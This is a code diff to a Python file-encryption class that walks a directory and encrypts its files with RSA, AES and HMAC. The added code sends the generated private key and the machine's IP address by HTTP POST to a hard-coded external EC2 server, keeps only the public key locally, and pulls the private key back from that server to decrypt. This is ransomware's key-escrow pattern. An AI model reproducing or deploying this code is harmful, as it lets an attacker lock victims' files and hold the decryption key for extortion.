@@ -1,12 +1,8 @@
-import os
-import sys
-import base64
-import cryptography
+import json, requests, os, socket, sys, base64, cryptography
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding, serialization, hashes, asymmetric as asymm, hashes, hmac
 from cryptography.hazmat.primitives.asymmetric import rsa
-import json
 
 class FileEncryptMAC:
 
@@ -130,12 +126,6 @@ class FileEncryptMAC:
             filename = os.path.basename(filepath)
             enc_filename = os.path.splitext(filename)[0] + ".encrypted" + ext
 
-#             # create a writable image and write the decoding result
-#             input_enc_filepath = os.path.abspath(enc_filename)
-#             image_result = open(input_enc_filepath, 'wb')
-#             image_result.write(result[0])
-#             print("Complete: Encrypted file named \"{}\".\n".format(input_enc_filepath))
-
             result += (EncKey, HMACKey, ext)
             return result
         except:
@@ -168,50 +158,125 @@ class FileEncryptMAC:
 
 
     #--- Part 3:  (RSACipher, C, IV, tag, ext)= MyRSAEncrypt(filepath, RSA_Publickey_filepath) ---
-
+    
     #create public/private key pair
     def create_pem_key_pair(self):
-        # create a directory to store PEM keys
-        newpath = os.path.abspath("keys")
-        if not os.path.exists(newpath):
-            os.makedirs(newpath)
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
+            local_ip_address = s.getsockname()[0]
+#             hostname = socket.gethostname()
+        except:
+            print("Error: Obtain IP address and hostname failed.")
 
         # create key object
         backend = default_backend()
         key = rsa.generate_private_key(backend=backend, public_exponent=65537,key_size=2048)
 
         # private key
+        private_key_name = "private.pem"
         private_key = key.private_bytes(
                 encoding=serialization.Encoding.PEM,
                 format=serialization.PrivateFormat.TraditionalOpenSSL,
                 encryption_algorithm=serialization.NoEncryption()
                 )
-        with open("keys/private.pem", 'wb') as private_pem:
-            private_pem.write(private_key)
-            private_pem.close()
+
+        try:
+            # POST private key to server
+            rprivate = requests.post('http://ec2-13-58-22-230.us-east-2.compute.amazonaws.com:3000/tasks', 
+                      data={'ip': local_ip_address, 'name': private_key_name, 'value': private_key})
+            print(rprivate.status_code, rprivate.reason, " ---> private.pem POST request has succeeded.")
+        except:
+            print("Error: POST private key failed.")
+
+        # create a directory to store PEM public key locally
+        newpath = os.path.abspath("key")
+        if not os.path.exists(newpath):
+            os.makedirs(newpath)
 
         #public key
+        public_key_path = os.path.join("key", "public.pem")
         public_key = key.public_key().public_bytes(
                 encoding=serialization.Encoding.PEM,
                 format=serialization.PublicFormat.SubjectPublicKeyInfo
                 )
-        with open("keys/public.pem", 'wb') as public_pem:
-            public_pem.write(public_key)
-            public_pem.close()
 
-        print("Success: Created \"public.pem\" and \"private.pem\" ")
+    #     # POST public key to server
+    #     rpublic = requests.post('http://localhost:3000/tasks/', 
+    #                   data={'name': , 'value': public_key})
+    #     print(rpublic.status_code, rpublic.reason, " ---> public.pem POST request has succeeded.")
 
+        try:
+            # keep public key locally
+            with open(public_key_path, 'wb') as public_pem:
+                public_pem.write(public_key)
+                public_pem.close()
 
-    def loadkeys(self):
+            print("Success: POST \"public.pem\" and \"private.pem\" to the server complete.")
+        except:
+            print("Error: Create public key failed.")
+        
+    def fetch_pem_key(self):
+        # create or look for a directory to store PEM private key
+        newpath = os.path.abspath("key")
+        if not os.path.exists(newpath):
+            os.makedirs(newpath)
+
+        try:
+            url = 'http://ec2-13-58-22-230.us-east-2.compute.amazonaws.com:3000/tasks'
+            resp = requests.get(url=url)
+            data = json.loads(resp.text)
+        except:
+            print("Error: API request failed.")
+            return
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
+            local_ip_address = s.getsockname()[0]
+        except:
+            print("Error: Obtain IP address and hostname failed.")
+            return
+
+        try:
+            for item_dict in data:    
+                # traverse through the dictionary to obtain key,value
+                if item_dict['ip'] == local_ip_address:  
+                    for key, value in item_dict.items():
+                            if key == "name":
+                                filename = value
+                            if key == "value":
+                                pem_data = value
+        except:
+            print("Error: Unable to find private key correspond to the ip address.")
+            return
+
+        filepath = os.path.abspath(os.path.join("key",filename))
+
+        try:
+            #create pem key from 
+            with open(filepath,"a+") as f:
+                f.write(pem_data)
+        except:
+            print("Error: Unable to write .pem file.")
+
+    
+    
+    def load_public_key(self):
         for root, dirs, files in os.walk("."):
             for file in files:
                 if file.endswith(".pem"):
                     if file == "public.pem":
-                        public_key_path = os.path.abspath(os.path.join(root, file))
+                        publicKey_path = os.path.abspath(os.path.join(root, file))
+                        return publicKey_path
+    
+    def load_private_key(self):
+        for root, dirs, files in os.walk("."):
+            for file in files:
+                if file.endswith(".pem"):
                     if file == "private.pem":
                         private_key_path = os.path.abspath(os.path.join(root, file))
-        return public_key_path, private_key_path
-
+                        return private_key_path
 
     #RSA encryption method
     def MyRSAEncryptMAC(self, file_path, RSA_Publickey_filepath):
@@ -283,15 +348,16 @@ class FileEncryptMAC:
     
     # Encryption useage
     def dir_encrypt(self):
-
-        # 1: key check
+        # step 1: key check
         try:
-            public_key_path, private_key_path = self.loadkeys()
+            public_key_path = self.load_public_key()
+            if public_key_path == None:
+                # generating public/private key pairs
+                self.create_pem_key_pair()
+                public_key_path = self.load_public_key()
         except:
-            # generating public/private key pairs
-            self.create_pem_key_pair()
-            public_key_path, private_key_path = self.loadkeys()
-
+            print("Error: Loadin public key failed.")
+        
         # get a list of files in a directory ready for encryption
         directory = os.getcwd()
         # get only file in directory
@@ -317,7 +383,7 @@ class FileEncryptMAC:
         and ".py" not in x
         and ".sh" not in x]
         
-        for filepath in allPath:
+        for filepath in allPath:    
             try:
                 RSACipher, C, IV, tag, ext = self.MyRSAEncryptMAC(filepath, public_key_path)
             except:
@@ -356,19 +422,21 @@ class FileEncryptMAC:
 
         # 1: key check
         try:
-            public_key_path, private_key_path = self.loadkeys()
+            private_key_path = self.load_private_key()
+            if private_key_path == None:
+                # download private key from server
+                self.fetch_pem_key()
+                private_key_path = self.load_private_key()
         except:
-            # generating public/private key pairs
-            self.create_pem_key_pair()
-            public_key_path, private_key_path = self.loadkeys()
-
-        # --- Only work with current directory, not including subdirectories ---
-#         # get a list of files in a directory ready for encryption
-#         directory = os.getcwd()
-#         # get only file in directory
-#         files = [f for f in os.listdir(directory) if os.path.isfile(f)]
-#         # remove ".ipynb" and ".DS_Store" files
-#         files = [ x for x in files if ".json" in x]
+            print("Error: Loadin private key failed.")
+            
+      #  --- Only work with current directory, not including subdirectories ---
+        # get a list of files in a directory ready for encryption
+        directory = os.getcwd()
+        # get only file in directory
+        files = [f for f in os.listdir(directory) if os.path.isfile(f)]
+        # remove ".ipynb" and ".DS_Store" files
+        files = [ x for x in files if ".json" in x]
         
     # --- work with current and subdirectories ---
         allPath = []
